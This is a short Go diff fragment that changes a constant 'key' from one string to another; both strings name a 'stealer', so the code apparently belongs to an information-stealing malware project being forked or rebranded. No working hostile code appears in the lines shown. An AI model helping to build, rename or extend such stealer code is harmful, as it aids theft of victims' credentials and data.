@@ -19,7 +19,7 @@ import (
 )
 
 const (
-	key = "1336StealerWillNeverDied"
+	key = "stanleySMODSPIRATESTEALER0109222"
 )
 
 var (
